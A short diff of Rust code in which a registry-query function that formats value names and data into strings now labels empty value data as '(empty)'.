@@ -251,12 +251,16 @@ fn query_key(path: String) -> Option<WyrmResult<String>> {
     // We got the values, so iterate them - we need to reconstruct everything as a string to send back
     if let Ok(vals) = open_key.values() {
         for (name, data) in vals {
-            let data_as_str = value_to_string(&data);
+            let mut data_as_str = value_to_string(&data);
             let name = if name.is_empty() {
                 "(default)".to_string()
             } else {
                 name
             };
+
+            if data_as_str.is_empty() {
+                data_as_str = String::from("(empty)");
+            }
 
             constructed.push(format!("[value name] {name}, [value data] {data_as_str}",));
         }
